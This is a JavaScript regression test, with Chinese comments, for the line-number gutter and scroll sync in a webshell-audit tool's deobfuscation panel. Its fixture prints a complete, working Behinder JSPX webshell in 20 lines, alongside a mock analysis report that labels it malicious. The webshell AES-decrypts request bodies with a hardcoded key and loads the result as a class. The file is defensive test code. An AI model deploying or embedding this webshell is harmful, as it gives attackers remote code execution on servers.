/**
 * 代码反混淆面板「行号栏」回归校验
 * ================================
 * 背景（真实缺陷）：
 *   单行载荷（源码 1 行，反混淆后 20 行）首次审计完成后，行号栏只剩 "1"；
 *   切换任务后恢复正常。根因是面板外的模块用「源码行数」写入了 #lineNumbers，
 *   而该元素由 report-view.js 独占维护。
 *
 * 本脚本覆盖三件事：
 *   1. 渲染正确性：真实记录样本（20 行 JSPX）渲染后，行号栏行数 == 代码行数 == 20；
 *   2. 两条数据通路一致性：流式审计（appendRaw → complete）与历史回放（loadHistory）
 *      必须给出相同行号，任何一侧不一致都是缺陷；
 *   3. 自愈与隔离：外部误写行号栏后，切回「代码反混淆」面板必须恢复正确行号；
 *      且静态检查确保除 report-view.js 外没有任何脚本写 #lineNumbers。
 */
const fs = require("fs");
const path = require("path");
const { pathToFileURL } = require("url");

// ── 最小 DOM 桩：只实现报告渲染真正触及的成员 ──
class FakeElement {
  constructor(id) {
    this.id = id;
    this.textContent = "";
    this._innerHTML = "";
    this.hidden = false;
    this.disabled = false;
    this.dataset = {};
    this.style = {};
    this.scrollTop = 0;
    this.scrollLeft = 0;
    this.offsetHeight = 0;
    this.clientHeight = 0;
    this._listeners = {};
    this.classList = { toggle() {}, add() {}, remove() {}, contains: () => false };
  }
  // 事件桩：滚动同步真的依赖监听器，不能只留个空壳
  addEventListener(type, handler) { (this._listeners[type] = this._listeners[type] || []).push(handler); }
  emit(type) { (this._listeners[type] || []).forEach(handler => handler()); }
  // 桩内同步派生出 textContent，便于断言 <pre> 的可见行数
  set innerHTML(value) { this._innerHTML = String(value); this.textContent = String(value).replace(/<[^>]*>/g, ""); }
  get innerHTML() { return this._innerHTML; }
  querySelector() { return new FakeElement(`${this.id}-child`); }
  querySelectorAll() { return []; }
  appendChild() {}
  remove() {}
  setAttribute() {}
}

function installDom() {
  const store = new Map();
  global.document = {
    getElementById(id) {
      if (!store.has(id)) store.set(id, new FakeElement(id));
      return store.get(id);
    },
    querySelectorAll() { return []; },
    createElement(tag) { return new FakeElement(tag); }
  };
  global.window = {};
  // MutationObserver 桩：守卫内部用它做自愈，不桩会导致整个守卫直接跳过，
  // 连带滚动监听也注册不上 —— 那样测试就测不到真实注册路径。
  global.MutationObserver = class { observe() {} disconnect() {} takeRecords() { return []; } };
  // getComputedStyle 桩：可滚范围对齐需要读边框宽度与行号栏当前补偿值
  global.getComputedStyle = element => {
    const raw = (element.style && element.style.borderBottom) || "";
    const matched = /^([\d.]+)px/.exec(raw);
    return { borderTopWidth: "0px", borderBottomWidth: matched ? `${matched[1]}px` : "0px" };
  };
  return store;
}

(async () => {
  const root = process.argv[2] || path.resolve(__dirname, "../..");
  const scriptsDir = path.join(root, "src", "shellsentry", "web", "static", "scripts");
  const moduleUrl = pathToFileURL(path.join(scriptsDir, "report-view.js")).href;

  const store = installDom();
  const { ReportView, syncDecodedGutter, alignDecodedGutterHeight } = await import(moduleUrl);

  let pass = 0, fail = 0;
  const check = (name, condition) => {
    if (condition) { pass++; console.log(`PASS ${name}`); }
    else { fail++; console.error(`FAIL ${name}`); }
  };

  // ── 夹具：取自真实历史记录 d24718e1（单行 JSPX 载荷，反混淆后 20 行）──
  const decodedLines = [
    '[LINE_1]<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">',
    '[LINE_2]<jsp:directive.page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"/>',
    '[LINE_3]<jsp:declaration>',
    '[LINE_4]class U extends ClassLoader{',
    '[LINE_5]    U(ClassLoader c){',
    '[LINE_6]        super(c);',
    '[LINE_7]    }',
    '[LINE_8]    public Class g(byte []b){',
    '[LINE_9]        return super.[[HL]]defineClass[[/HL]](b,0,b.length);',
    '[LINE_10]    }',
    '[LINE_11]}',
    '[LINE_12]</jsp:declaration>',
    '[LINE_13]<jsp:scriptlet>',
    '[LINE_14]String k="[[HL]]e45e329feb5d925b[[/HL]]";',
    '[LINE_15]session.[[HL]]putValue[[/HL]]("u",k);',
    '[LINE_16]Cipher c=[[HL]]Cipher.getInstance[[/HL]]("[[HL]]AES[[/HL]]");',
    '[LINE_17]c.init(2,new [[HL]]SecretKeySpec[[/HL]]((session.getValue("u")+"").getBytes(),"AES"));',
    '[LINE_18]new U(this.getClass().getClassLoader()).g(c.[[HL]]doFinal[[/HL]](new sun.misc.[[HL]]BASE64Decoder[[/HL]]().decodeBuffer([[HL]]request.getReader().readLine[[/HL]]()))).[[HL]]newInstance[[/HL]]().[[HL]]equals[[/HL]](pageContext);',
    '[LINE_19]</jsp:scriptlet>',
    '[LINE_20]</jsp:root>'
  ];
  const rawOutput = [
    "[IMAGE]",
    "- **定性标签**：冰蝎 JSP WebShell",
    "[/IMAGE]",
    "[DE_OBFUSCATE]",
    ...decodedLines,
    "[/DE_OBFUSCATE]",
    "[METADATA_BEHAVIOR]",
    "- **核心危险执行流**：外部输入经 AES 解密后反射实例化",
    "L18 || 反射实例化执行 || 请求体密文解密后直接实例化执行",
    "[/METADATA_BEHAVIOR]",
    "[C2_INFO]",
    "None",
    "[/C2_INFO]",
    "[PLAYBOOK]",
    "### 1. IOC 封锁清单",
    "**[恶意文件]**　　shell.jspx",
    "[/PLAYBOOK]"
  ].join("\n");
  const staticScan = {
    highlight_hints: [{ line: 16, text: 'Cipher.getInstance("AES', category: "c2_network", source: "regex" }]
  };
  const doneData = {
    verdict: "malicious",
    agent_verdict: { verdict: "malicious", confidence: 0.96, summary: "冰蝎 JSP WebShell", behavior_chain: ["L18 反射实例化"] }
  };
  const expectedNumbers = Array.from({ length: decodedLines.length }, (_, i) => i + 1).join("\n");

  // ── 1) 流式审计通路：start → setStatic → appendRaw → complete ──
  const live = new ReportView();
  live.start();
  live.setStatic(staticScan);
  rawOutput.split("").reduce((acc, _char, index) => {
    if (index % 97 === 0) live.appendRaw(rawOutput.slice(index, index + 97));
    return acc;
  }, null);
  live.complete(doneData);

  let gutter = store.get("lineNumbers").textContent;
  let code = store.get("decodedCode").textContent;
  check("live audit gutter has every visual line", gutter.split("\n").length === decodedLines.length);
  check("live audit gutter numbers match code lines", gutter === expectedNumbers);
  check("live audit code pane keeps 20 lines", code.split("\n").length === decodedLines.length);
  check("live audit keeps model highlight", store.get("decodedCode").innerHTML.includes('class="danger-token model">defineClass</mark>'));

  // ── 2) 历史回放通路：loadHistory（同一份记录必须给出同样的行号）──
  const replay = new ReportView();
  replay.loadHistory({ report: { raw_ai_output: rawOutput, regex_scan: staticScan, done: doneData, agent_verdict: doneData.agent_verdict } });
  check("history replay gutter equals live gutter", store.get("lineNumbers").textContent === expectedNumbers);

  // ── 3) 自愈：外部误写行号栏后，切回面板必须恢复 ──
  store.get("lineNumbers").textContent = "1";   // 模拟旧逻辑用「源码行数=1」覆盖
  check("external overwrite simulated", store.get("lineNumbers").textContent === "1");
  replay.selectSection("restoration");
  check("gutter self-heals when panel activated", store.get("lineNumbers").textContent === expectedNumbers);

  // ── 4) 空数据兜底：无反混淆内容时保持占位而非崩溃 ──
  const empty = new ReportView();
  empty.complete({ verdict: "no_indication", confidence: 0.2, summary: "无" });
  check("empty report falls back to placeholder gutter", store.get("lineNumbers").textContent === "1");

  // ── 5) 派生而非记忆：代码区内容一变，行号必须随之变（不依赖任何记忆值）──
  store.get("decodedCode").innerHTML = "<code>alpha\nbeta\ngamma</code>";
  syncDecodedGutter();
  check("gutter derives from code content", store.get("lineNumbers").textContent === "1\n2\n3");

  // ── 6) 外部误写后，无需切换面板也能立即同步 ──
  store.get("lineNumbers").textContent = "1";   // 模拟旧逻辑用「源码行数=1」覆盖
  syncDecodedGutter();
  check("gutter recovers without panel switch", store.get("lineNumbers").textContent === "1\n2\n3");

  // ── 7) 静态隔离：只有 report-view.js 允许解析 #lineNumbers ──
  // 写入点经由变量（gutter.textContent = ...），因此按"谁获取了这个元素"判定，
  // 比匹配赋值语句更本质；注释中的历史说明需先剥离，否则会误判。
  const stripComments = source => source
    .replace(/\/\*[\s\S]*?\*\//g, "")
    .replace(/(^|[^:])\/\/[^\n]*/g, "$1");
  const owners = [];
  for (const name of fs.readdirSync(scriptsDir).filter(item => item.endsWith(".js"))) {
    const code = stripComments(fs.readFileSync(path.join(scriptsDir, name), "utf8"));
    if (/getElementById\(\s*"lineNumbers"\s*\)|byId\(\s*"lineNumbers"\s*\)|elements\.lineNumbers\b/.test(code)) owners.push(name);
  }
  check("single module resolves #lineNumbers", owners.length === 1 && owners[0] === "report-view.js");

  const appSource = stripComments(fs.readFileSync(path.join(scriptsDir, "app.js"), "utf8"));
  check("app.js never touches gutter", !/lineNumbers/.test(appSource));

  // ── 8) 滚动同步：代码区滚动必须带动行号栏 ──
  // 真实缺陷（2026-09-20）：两列各自为政，只有 <pre> 有滚动条，
  // 行号栏纹丝不动 → 滚动后行号与代码完全错位，且被裁掉的行号永远看不见。
  {
    const codeEl = store.get("decodedCode"), gutterEl = store.get("lineNumbers");
    check("code pane registers scroll listener", (codeEl._listeners.scroll || []).length > 0);

    codeEl.scrollTop = 400;
    codeEl.emit("scroll");
    check("gutter follows code when scrolled down", gutterEl.scrollTop === 400);

    codeEl.scrollTop = 137;
    codeEl.emit("scroll");
    check("gutter tracks arbitrary offsets", gutterEl.scrollTop === 137);

    codeEl.scrollTop = 0;
    codeEl.emit("scroll");
    check("gutter returns to top with code", gutterEl.scrollTop === 0);

    // 横向不得同步：行号列本就固定在左侧，只有代码内容左右移动
    codeEl.scrollLeft = 250;
    codeEl.emit("scroll");
    check("horizontal scroll does not move gutter", gutterEl.scrollLeft === 0 && gutterEl.scrollTop === 0);

    // 重新渲染后偏移必须重新对齐（内容变化会把代码区滚动位置钳制/归零）
    codeEl.scrollTop = 400;
    syncDecodedGutter();
    check("gutter realigns after content resync", gutterEl.scrollTop === codeEl.scrollTop);
  }

  // ── 9) 可滚范围对齐：横向滚动条出现时必须补偿，消失时必须清零 ──
  // 超长行会带来约 15px 高的横向滚动条，占掉代码区的可见高度；
  // 不补偿则滚到极限时行号落后同样的距离（实测末行差 15px）。
  {
    const codeEl = store.get("decodedCode"), gutterEl = store.get("lineNumbers");
    codeEl.offsetHeight = 445;
    codeEl.clientHeight = 430;              // 差额 15px = 横向滚动条
    alignDecodedGutterHeight();
    check("gutter compensates horizontal scrollbar", gutterEl.style.borderBottom === "15px solid transparent");

    codeEl.clientHeight = 445;              // 滚动条消失 → 必须清零，否则反向错位
    alignDecodedGutterHeight();
    check("gutter clears compensation when no scrollbar", !gutterEl.style.borderBottom);

    codeEl.offsetHeight = 0;                // 面板隐藏时读不到尺寸 → 不得留下上一轮的补偿值
    codeEl.clientHeight = 0;
    alignDecodedGutterHeight();
    check("gutter stays neutral when pane is hidden", !gutterEl.style.borderBottom);
  }

  console.log(`PASS=${pass} FAIL=${fail}`);
  process.exitCode = fail ? 1 : 0;
})().catch(error => { console.error(error); process.exitCode = 1; });
